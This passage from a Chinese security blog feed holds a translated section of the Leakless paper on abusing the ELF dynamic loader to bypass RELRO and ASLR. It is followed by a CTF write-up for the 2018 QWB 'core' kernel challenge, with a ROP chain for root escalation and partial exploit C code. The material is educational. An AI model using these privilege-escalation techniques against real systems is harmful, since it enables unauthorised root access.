攻击</strong></p><p>Leakless使攻击者只用名字就能够调用任意库函数，不需要关于内存布局以及漏洞程序库的信息。为了达到这个目标，Leakless活用了动态装载器，强迫其解析请求的函数。由于它和内存破坏漏洞的破坏性有着同样的根源：可控数据和不可控数据的混杂，所以这样的攻击同样可能。在栈溢出的攻击案例中，可控数据的问题就出在保存的返回地址上。对于动态装载器来说，可控数据就是众多用于符号解析的数据结构。特别地，函数的名字，保存在.dynstr段中，与返回地址相似：当函数被调用，它也指定了一个特定的指向目标。</p><p>动态装载器认为它接受到的参数都是值得信任的，因为它假设这些都是直接由ELF文件提供的或者它自己在开始时初始化的。然而，当一个攻击者能够修改这些数据时，这个假设就不成立了。一些动态装载器(FreeBSD)会验证自己接收到的输入。然而，他们还是完全地信任控制结构，但这些也会被Leakless轻易地破坏。</p><p>Leakless被设计用于利用一个存在的漏洞(指缓冲区溢出等)。Leakless的输入包括可执行ELF文件，一组ROP Gadgets的集合，和攻击者希望调用的库函数名称(典型的例子就是execve())。有了这些信息，Leakless输出了一段ROP的攻击载荷(payload)能够执行需要的库函数，且能够绕过多种应用在二进制文件上的加固技术。这段ROP链通常来说非常短：依赖于二进制文件中的减缓技术，需要3到12此不等的写操作。一些Leakless产生的输出的例子能够在Leakless代码库的文档里找到 [17]。</p><p>Leakless不需要任何关于库地址和内容的信息；我们假设ASLR在所有的动态库上启用且不能获得关于它们的任何知识。然而，我们需要假设可执行文件不是”位置无关的”，所以它们会被加载到内存中的特定位置。我们在7.2节中讨论了这个限制，并且在6.2节中展示了位置无关可执行(Position Independent Executables，PIE)文件在现代操作系统中的分布情况。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299634941/0" alt="image-20210317215119814"></p><p>Figure 2：攻击图示。阴影背景表示只读的内存，白色背景表示可写的内存，红色或加粗的部分表示攻击者伪造的数据</p><p>a) 4.1节中攻击的例子。攻击者能够改写DT_STRTAB条目的内容，欺骗动态装载器使其认为.dynstr段在.bss段中，并在那里伪造一个假的字符串表。当动态装载器尝试解析printf时将会使用不同的基地址来寻找函数的名称，最终实际会解析并执行execve。</p><p>b) 4.2节中攻击的例子。传递给_dl_runtime_resolve的参数reloc_index超出了.rel.plt段并最终落在.bss段，在那里攻击者伪造了Elf_Rel结构。这个重定位项指向一个就位于其后的Elf_Sym结构，而Elf_Sym结构中的index同样超出了.dynsym段。这样这个符号就会包含一个相对.dynstr地址足够大的偏移使其能够达到这个符号之后的一段内存，那里保存着这个将要调用的函数的名称。</p><p>在多数情况下，Leakless并不依赖目标系统上允许的动态装载器的实现和版本，不过有些攻击需要一些小的改动以适应不同的动态装载器的实现。</p><p>值得注意的是Leakless的目标，即获得一个库函数的地址并指向它，于libdl库中的dlsym函数十分相似。但在实际当中这个函数很少被应用程序使用，所以，它的地址一般攻击者也不知道。</p><p><strong>4.1 基础情形</strong></p><p>就像第3节于图1中展示的那样，动态装载器从.rel.plt中的Elf_Rel结构开始工作，顺着其中的下标找到.dynsym段中对应的Elf_Sym结构的位置，并最终使用它确定待解析符号的名称(在.dynstr段中的一段字符串)。最简单的调用任意函数的办法就是使用希望的函数名称覆盖字符串表中的条目，然后再调用动态装载器，但这是不可能的，因为保存着动态符号字符串表的段，即.dynstr，是不可写的。</p><p>然而，动态装载器是从.dynamic段的DT_STRTAB条目中获得.dynstr段的地址的，而且DT_STRTAB条目的位置是已知的，默认情况下也可写。这样，就像图2a中展示的那样，我们可以将这个条目的d_val域覆盖为一个指向攻击者控制内存区域的指针(典型的就是.bss或.data段)。这块内存区域上将会包含一个字符串，比如execve。到了这一步，攻击者需要选择一个已经存在的符号，它的偏移在伪造的字符串表中正好指向execve的位置，接着调用其对应的符号解析重定位过程。可以通过将其重定位项的偏移压栈并跳转到PLT0实现。</p><p>这种方式非常简单，但仅当二进制程序的.dynamic段可写时有效。对于部分使用或者完全RELRO编译的二进制程序，需要使用更复杂的攻击。</p><p><strong>4.2 绕过部分RELRO</strong></p><p>就像我们在3.3节中解释的那样，_dl_runtime_resolve函数的第二个参数是Elf_Rel条目在重定位表(.rel.plt段)中对应当前请求函数的偏移。动态装载器将这个值加上.rel.plt的基地址来得到目标Elf_Rel结构的绝对地址。然而多数动态装载器实现不去检查重定位表的边界。这就表明如果一个大于.rel.plt的值传到 _dl_runtime_resolve中，装载器将会认为特定的地址上的数据是一个Elf_Rel结构并使用它，即使那里已经超出了.rel.plt段的范围。</p><p>就像图2b显示的那样，Leakless计算一个能够将_dl_runtime_resolve导向到攻击者控制的内存空间的下标值。然后它制造一个Elf_Rel结构，并填写r_offset的值为一个可写的内存地址来将解析后的函数地址写在那里。同理，r_info的值将会是一个将动态装载器导向到攻击者控制内存的下标。Leakless会将一个伪造的Elf_Sym对象放在那个下标对应的位置，其中的st_name域，这个值也大到足以达到攻击者控制的内存。在这段内存最后，Leakless会放置将要执行的函数的名称。</p><p>总之，Leakless将这一条符号解析过程中需要使用的结构链全部都伪造了出来，完全控制了对于攻击者控制内存中内容的”函数调用的过程” 。在这之后，Leakless将计算好的假Elf_Rel结构的偏移压栈，并调用PLT0代码。</p><p>然而，这个方法会受到几个限制。首先Elf_Rel的下标需要是整数，因为r_info域在ELF标准中规定是一个无符号整数。这就意味着在实际中这块可写的内存空间(例如.bss段)必须是位于.dynsym段之后。在我们的评估中，情况总是满足的。</p><p>另一个限制是ELF会使用在3.4节中提到的符号版本系统。在这种情况下，Elf_Rel.r_info域不仅用作动态符号表中的下标，也用作符号版本表(.gnu.version段)中的下标。通常来说，Leakless能够自动的满足这些限制，除了x86-64中使用huge pages的小型二进制程序 [32]。我们在附录A中详述了关于符号版本的额外限制。当这些限制不能被满足时，必须使用一个替代的方法。这就需要活用动态装载器，通过破坏其内部数据结构来改变动态解析的过程。</p><p><strong>4.3 破坏动态装载数据</strong></p><p>我们会想起_dl_runtime_resolve的第一个参数是一个指向link_map数据类型的指针。这个结构体，包含了ELF可执行文件的信息，而且这些内容会被动态装载器完全地信任。此外，Leakless可以获得有漏洞程序的GOT表的第二个条目，它的位置是确定已知的。</p><p>回想3.5节中link_map的结构，在I_info域中，包含着.dynamic段所有条目指针构成的一个数组。这些指针就是动态链接器拿来定位符号解析过程中使用的对象的。就像图3中显示的那样，通过覆盖这个数据结构的一部分，Leakless能够将I_info域中的DT_STRTAB条目指向一个特意制造的动态条目，那里指向一个假的动态字符串表。结果，攻击者就可以将攻击简化为4.1节中的基础情形了。</p><p>这个技术较上一节中的技术而言有着更加广泛的适用性，因为它没有特定的限制。特别的，它对于使用huge pages的小型64位ELF同样适用。然而，相比于之前只依赖于标准ELF的特性的攻击，在这种情况(和下一节要叙述的情况)下，我们需要假设特定glibc的结构(link_map)布局是已知的。每个动态装载器有它自己的结构实现，故当面对不同的动态装载器时就需要做一些小的改动。需要注意的是link_map的布局在同一种动态装载器的不同版本之间也可能不同。然而，他们显得非常稳定，尤其是glibc中的相关结构从2004年起就没变过。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13303009978/0" alt="image-20210318172320228"></p><p>Figure 3：4.3节中攻击的例子。攻击者通过解引用GOT的第二项来取得link_map结构。在这个结构中破坏保存DT_STRTAB指针的I_info域。它的值被设为一个伪造的动态条目的地址，那里指向了一个位于.bss段中的假的动态字符串表。</p><p><strong>4.4 完全RELRO的情形</strong></p><p>Leakless可以绕过完全RELRO的保护。</p><p>当完全RELRO应用时，所有的重定位将在加载时完成，不会有惰性解析的过程，并且link_map结构的地址和在GOT中的_dl_runtime_resolve也不会被初始化。所以，像普通技术绕过部分RELRO那样直接获得它们的地址是不可能的。然而，从动态表的DT_DEBUG条目中间接恢复这两个值仍然是可能的。DT_DEBUG条目的值是动态装载器在加载时设置好的，它指向一个r_debug类型的数据结构。这个数据结构保存着调试器用来标识动态装载器的基地址并拦截相应事件需要的信息。此外，这个结构的r_map域保存着一个指向link_map链表头部的指针。</p><p>Leakless破坏了这个链表中描述ELF可执行文件的第一个节点，使得用于保存DT_STRTAB的I_info条目指向一个假的动态字符串表的指针。具体情形如图4所示。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13303168289/0" alt="image-20210318174657414"></p><p>Figure 4：4.4节中的攻击图示。阴影背景表示只读的内存，白色的背景表示可写的内存，红色与加粗的部分表示攻击者伪造的数据。攻击者使用DT_DEBUG这个动态条目来获取r_debug结构，接着，解引用r_map域从而得到主程序的link_map结构，然后像第3节中展示的那样破坏I_info[DT_STRTAB]。因为完全RELRO的缘故.got.plt是只读的，攻击者需要伪造一个重定位项。为此，他破坏I_info[DT_JMPREL]使其指向一个假的动态条目，而这个动态条目则指向一个重定位项。这个重定位项引用了一个已经存在的printf符号，但r_offset则指向一块可写的内存区域。</p><p>接着攻击者同样需要恢复_dl_runtime_resolve函数的指针，因为完全RELRO现在它在主程序的GOT中已经不存在了，所以他解引用I_info域中的第一个link_map结构取得描述第一个共享库的link_map，而这个共享库是不被完全RELRO保护的。攻击者通过I_info[DT_PLTGOT]域来得到对应的动态条目(右侧的.dynamic)，接着是.plt.got段(总是在右侧)，其中的第二个条目里就有 _dl_runtime_resolve的地址。</p><p>在这之后，Leakless必须调用_dl_runtime_resolve，将刚刚破坏的link_map结构作为第一个参数传过去，并将一个新的.dynsym偏移作为第二个参数传过去。然而，就像之前提到的那样， _dl_runtime_resolve因为完全RELRO的缘故在GOT中已经不存在了。所以，Leakless必须在另一个ELF对象的GOT表中找到它的地址，换句话说，就是一个被程序使用而没有完全RELRO保护的库。在大多数情况下，只有ELF可执行文件本身是被完全RELRO保护的，但库并不会。这是因为RELRO是在牺牲性能的前提下，用来加固一些被认为比较”有风险”的特定应用程序的。在共享库上应用完全RELRO将会影响所有使用这个库应用程序的性能，所以库文件一般是不受保护的。因为各个库在链表上的顺序是确定的，Leakless可以解引用link_map中的I_next项来得到不被完全RELRO保护的库文件的link_map，解引用它的I_info项得到对应的DT_PLTGOT动态条目的值，再解引用它的值(即这个库GOT的基地址)，就可以从GOT中获得 _dl_runtime_resolve的地址了。</p><p>Leakless接下来必须要克服以下问题：_dl_runtime_resolve不仅仅会调用目标函数，还会尝试将它的地址写到正确的GOT项中。如果这件事发生，程序就会崩溃，因为完全RELRO保护下GOT是不可写的。我们可以通过伪造link_map中的DT_JMPREL动态条目来绕过这个问题。原本DT_JMPREL指向.rel.dyn段，Leakless将其指向攻击者控制的一块内存区域，那里写有一个Elf_Rel结构，且其r_offset域指向一块可写的内存区域，其r_info指向我们的目标符号。所以，当一个库被解析的时候，它的地址将会被写到一个可写的位置，程序就不会崩溃了，而且请求的函数也将会被执行。</p><p>==================================================================================</p><p><strong>5. 实现</strong></p><p>Leakless将会分析二进制文件以确定它的技术是否适用，接着制造必要的数据，然后生成一段ROP链来实现所选的技术。至于发现最初始的漏洞以及自动提取有用的gadgets那并非我们的工作，它们已经在很多著作中被很好地研究和实现过了[6,16,19,20,34,38]。我们将Leakless设计成与多种gadget发现技术兼容，并实现了一个手动的后端(用户可以给程序提供gadgets)，另外还有一个使用ROPC [22] 的后端。ROPC是一个以Q [34] 提出的方法为基础实现的一个自动化ROP编译器的原型。</p><p>我们还开发了一个小型的测试套件，由一个具有基于栈的缓冲区溢出的C程序组成，同时提供无保护，部分RELRO和完全RELRO的版本。这个测试套件可以在x86，x86-64，arm架构的GNU/Linux系统和x86-64架构的FreeBSD系统上运行。</p><p><strong>5.1 需要的Gadgets</strong></p><p>Leakless包含了4种用于不同加固措施的利用技术。应用这些不同的技术需要提供不同的gadgets。表2是对这些gadgets类型的一个总结。write_memory gadget主要用于在已知地址伪造数据结构，deref_write gadget用于遍历和破坏数据结构(尤其是link_map)。deref_save和copy_to_stack gadgets是用于在完全RELRO的情况中的。前者的目的是将link_map和_dl_runtime_resolve的地址保存在一个已知位置，而后者的则是用来将link_map和重定位项的下标放到栈上然后调用 _dl_runtime_resolve，因为使用PLT0已经不可行。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13352984082/0" alt="image-20210330101743455"></p><p>Table 2：多种方法需要的Gadgets。”Signature”列代表gadget的名字和它接受的参数，”Implementation”代表gadget行为的类C伪代码。最后四列指示了某个gadget是否在第四节里对应的方法中需要。”N”表示没有RELRO，”H”表示部分RELRO且为使用huge pages的小型64位程序，”F”则表示完全RELRO。</p><p>对于感兴趣的读者，我们提供了Leakless在两组不同的缓解技术保护下进行利用的深度样例，放在Leakless代码库的文档中 [17]。</p><p>==================================================================================</p><p><strong>6.评估</strong></p><p>我们使用4种方法对Leakless进行了评估。首先我们确定了我们的技术对于不同动态装载器实现的适用性。接着分析了多个流行的GNU/Linux以及BSD的发行版(Ubuntu，Debian，Fedora和FreeBSD)中的二进制文件，从而确定易受我们攻击影响的二进制文件所占的比率。然后我们将Leakless应用在对真实世界中Wireshark的一个有漏洞版本的利用中，以及一个针对Pidgin的更加复杂的攻击中。最后我们使用一个图灵完全的ROP编译器来实现Leakless的方法和两个以前使用的技术，并比较他们生成出的链的大小。</p><p><strong>6.1 动态装载器</strong></p><p>为了展示Leakless的普适性，尤其是针对不同的基于ELF的平台，我们调查了几种动态装载器的实现。特别地，我们发现GNU C标准库(也就是GNU/Linux发行版中广泛使用的glibc)的动态装载部分，其他一些Linux实现例如dietlibc，uClibc和newlib(在嵌入式系统中广泛使用)，以及OpenBSD和NetBSD的实现都含有可以被Leakless利用的漏洞。另一种嵌入式库，musl，则不会受到我们方法的影响因为它不支持惰性装载。Bionic，Android中使用的C标准库，同样不可利用，因为它只支持PIE的二进制文件。最有趣的例子，不同于所有我们分析的装载器，是FreeBSD的实现。实际上，它是唯一一个会对传进_dl_runtime_reslove的参数进行边界检查的。所有其他的装载器完全信任传入的参数。不仅如此，所有被分析的装载器都完全地信任控制结构，而Leakless会在多数攻击中破坏这个结构。</p><p>总结来说，在我们分析的装载器中，只有2哥在设计上对Leakless是免疫的：musl，它不支持惰性符号解析；以及bionic，它只支持PIE可执行文件。此外，因为FreeBSD的动态装载器会进行边界检查，4.2节中的技术已经不适用了。不过其他的技术还是可以起效。</p><p><strong>6.2 操作系统调研</strong></p><p>为了能明白Leakless对真实世界的操作系统的影响，我们对几个Linux和BSD发行版中默认安装的二进制程序进行了一次调研。特别地，我们检查了所有在/sbin，/bin，/usr/bin和/usr/bin目录下的程序，并将它们按照Leakless技术的适用性进行分类。我们考虑的发行版有Ubuntu 14.10，Debian Wheezy，Fedora 20，和FreeBSD 10。我们同时使用了这些系统的x86和x86-64的版本。在Ubuntu和Debian上，我们另外安装了LAMP(Linux，Apache，MySQL，PHP)栈作为模拟一个典型服务器部署、配置的尝试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;作者：Alessandro Di Federico, Amat Cama, Yan Shoshitaishvili, Christopher Kruegel and Giovanni Vigna(UCSB,CA, USA; Politecnico di Milano, Mi
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="ELF" scheme="https://billyotry.github.io/tags/ELF/"/>
    
  </entry>
  
  <entry>
    <title>【Kernel Pwn】2018QWB core</title>
    <link href="https://billyotry.github.io/2021/03/06/%E3%80%90Kernel%20Pwn%E3%80%912018QWB%20core/"/>
    <id>https://billyotry.github.io/2021/03/06/%E3%80%90Kernel%20Pwn%E3%80%912018QWB%20core/</id>
    <published>2021-03-06T06:09:03.108Z</published>
    <updated>2021-03-17T04:11:59.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先到手几个文件</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247549408/0" alt="image-20210306142520926"></p><p>解压出文件系统后发现里面有个shell脚本<code>gen_cpio.sh</code>来生成<code>core.cpio</code>，每次我们修改了内核的启动<code>init</code>后我们就要重新打包一份<code>core.cpio</code>，我们可以直接将他写进我们的启动脚本里面</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd core</span><br><span class="line">./gen_cpio.sh core.cpio</span><br><span class="line">mv core.cpio ../core.cpio</span><br><span class="line">cd ..</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&#x27; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-gdb tcp::123 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>接着观察下<code>init</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 120 -f &amp; 定时关机</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>由于存在<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>，导致我们无法在非root权限下查看<code>/proc/kallsyms</code>，也就是符号地址，但是它已经⽤ <code>cat /proc/kallsyms &gt; /tmp/kallsyms</code> ，也可以通过 <code>/tmp/kallsyms</code> 读到符号地址。</p><p>这里我们将定时关机注释掉，并且将1000改0为，以便在启动后直接在root权限下，方便操作。注意到<code>insmod /core.ko</code>，这个就是我们加载的驱动，一般来说漏洞就在这里面，是我们分析的主要目标。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析core.ko</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247652132/0" alt="image-20210306144902690"></p><p>发现是开了NX和Canary，然后内核是开了kaslr。</p><p>在core.ko驱动中主要实现了几个函数。</p><p><strong>init_module</strong></p><p>模块一加载就会先执行这个函数，<code>proc_create</code>会创建一个PROC entry，用户可以通过对文件系统中的该文件，和内核进行数据的交互。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_dir_entry *<span class="title">proc_create</span><span class="params">(    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">umode_t</span> mode, struct proc_dir_entry *parent,    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> struct file_operations *proc_fops)</span> </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_fops, <span class="literal">NULL</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单介绍下参数：</p><ul><li>name：名字</li><li>mode：文件模式</li><li>parent：父entry，为0的话，默认父entry是/proc</li><li>proc_fops：操作函数表</li></ul><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247685830/0" alt="image-20210306145759918"></p><p>然后我们看proc_fops：回调函数表，是个data段的变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">core_fops       </span><br><span class="line">offset:0dq offset __this_module </span><br><span class="line">offset:18dq offset core_write </span><br><span class="line">offset:48dq offset core_ioctl </span><br><span class="line">offset:78dq offset core_release</span><br></pre></td></tr></table></figure><p>代表了我们可以进行的操作</p><p><strong>core_ioctl</strong></p><p>就是通过不同的cmd调用不同的函数的功能</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247740445/0" alt="image-20210306150911596"></p><p><strong>case：0x6677889C：</strong>通过第三个参数可以控制<code>off</code>的值，这个值在<code>core_read</code>函数中有用到。</p><p><strong>case：0x6677889B：</strong>调用<code>core_read</code>函数。其中主要是调用<code>copy_to_user</code>将内核中的数据拷贝到用户空间中，并且偏移通过<code>off</code>来计算，也就是我们可以控制<code>off</code>来达到越界读取的功能。这里我们就可以用来泄露<code>canary</code>。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247784577/0" alt="image-20210306152019523"></p><p><strong>case：0x6677889A：</strong>调用<code>core_copy_func</code>函数。主要是把bss段上a1个字节拷贝到v2上，然后v2是栈上的一个变量，这里就可以实现我们的栈溢出，并且我们可以看到a1在判断大小的时候是<code>int</code>类型，判断完进行拷贝操作的时候变成了无符号类型，那么我们就可以负数溢出，传入一个负数来绕过大小check。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247805369/0" alt="image-20210306152513125"></p><p>这里还有一个重要的点就是<code>qmemcpy</code>函数在进行拷贝的时候只使用最后面两个字节（如使 ⽤ 0xffffffff00000000 | 0x0100 实现的是拷⻉0x100字节）。</p><p><strong>core_write</strong></p><p>这个函数没有在<code>ioctl</code>中调用，我们可以直接通过<code>write</code>系统调用来调用，因为他肯定是和<code>write</code>事件绑定。</p><p>主要的功能就是从用户态拷贝<code>size</code>个字节到<code>name</code>变量中，这里的name变量在前面<code>core_copy_func</code>有调用，也就是我们可以先调用<code>core_write</code>将我们的数据拷贝到<code>name</code>中，在调用<code>core_copy_func</code>函数将name中的数据拷贝到<code>v2</code>变量中，如果够长就能够覆盖掉返回地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247835898/0" alt="image-20210306153230627"></p><p><strong>core_release</strong></p><p>打印一句话退出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247836217/0" alt="image-20210306153235905"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这里我们利用内核空间ROP来操作。因为没有SMEP保护，也可以re2usr。</p><p>首先我们就是要先泄露出canary，和一些有用的真实内核地址</p><p>这里我们进行调试，还记得我们之前将内核的启动init中1000改为了0后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247874416/0" alt="image-20210306153942525"></p><p>然后我们在gdb启动后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247878080/0" alt="image-20210306154033673"></p><p>然后我们在<code>core_read</code>函数中下断点</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247893018/0" alt="image-20210306154410011"></p><p>执行到这里，此时canary以及放入到栈中，我们查看以下栈空间</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247898480/0" alt="image-20210306154532756"></p><p>可以看到我们的canary放到的<code>rsp+40</code>的地方，接下来是<code>rbp</code>和<code>ret</code>，我们设置core_read中的<code>off</code>为<code>0x40</code>就能将canary泄露出来。</p><p>由于开启的kaslr，我们就需要泄露base基址，得到真实的gadget地址。</p><p>我们可以先用gadget和预设的vmlinux基地址间的偏移，然后用偏移加上真实的内核基地址后就可以得到真实的gadget地址。</p><p>我们可以用下面的脚本来计算偏移值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * elf = ELF(<span class="string">&#x27;./fs/vmlinux&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;commit_creds&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;commit_creds&#x27;</span>]-<span class="number">0xffffffff81000000</span>) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;prepare_kernel_cred&quot;</span>,<span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>]-<span class="number">0xffffffff81000000</span>)</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247936576/0" alt="image-20210306155559515"></p><p>对于真实的基地址我们可以通过读取<code>kallsyms</code>文件来读取</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE* base=popen(<span class="string">&quot;grep startup_64 /tmp/kallsyms |awk -F&#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;&quot;</span>,<span class="string">&quot;r&quot;</span>); <span class="built_in">fscanf</span>(base,<span class="string">&quot;%p&quot;</span>,&amp;base_addr);</span><br></pre></td></tr></table></figure><p>接下来就是找gadget。                                                                                                                                                                                   </p><p>这里找gadget有一个非常非常非常非常坑的点就是要用bzImage提取出来的vmlinux来找，别问为什么。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p>然后用ropper搜gadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ropper --file vmlinux --nocolor &gt; rop.txt</span><br></pre></td></tr></table></figure><p>然后我们搜索需要用到的gadget</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248163635/0" alt="image-20210306161241929"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248011591/0" alt="image-20210306161302892"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248012580/0" alt="image-20210306161318986"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248013485/0" alt="image-20210306161334561"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13248016467/0" alt="image-20210306161420691"></p><h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>ROP如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop rdi;ret</span><br><span class="line">0;</span><br><span class="line">prepare_kernel_cred</span><br><span class="line">pop rdx,ret;</span><br><span class="line">commit_creds</span><br><span class="line">mov rdi,rax;call rdx</span><br><span class="line">swapgs;popfq;ret</span><br><span class="line">0</span><br><span class="line">iretq;ret</span><br><span class="line">system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure><p>我们需要注意的一点就是rop在iretq时，会依次弹出rip、cs、rflags、sp、ss之后做一些判断，如果不能构造好这些参数，系统就会崩溃，所以我们提前写个函数将这些参数保存起来。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">__asm__(</span><br><span class="line"><span class="string">&quot;mov user_cs, cs;&quot;</span>            </span><br><span class="line"><span class="string">&quot;mov user_ss, ss;&quot;</span>            </span><br><span class="line"><span class="string">&quot;mov user_sp, rsp;&quot;</span>            </span><br><span class="line"><span class="string">&quot;pushf;&quot;</span>            </span><br><span class="line"><span class="string">&quot;pop user_rflags;&quot;</span>            </span><br><span class="line">);    </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>); </span><br><span class="line">&#125; <span class="comment">//这种汇编写法，编译的时候需要加上 -masm=intel</span></span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">binsh</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">void</span>* commit_creds;</span><br><span class="line">    <span class="keyword">void</span>* base_addr;</span><br><span class="line">    <span class="keyword">void</span>* prepare_kernel_cred;</span><br><span class="line">    </span><br><span class="line">    FILE* base=popen(<span class="string">&quot;grep startup_64 /tmp/kallsyms |awk 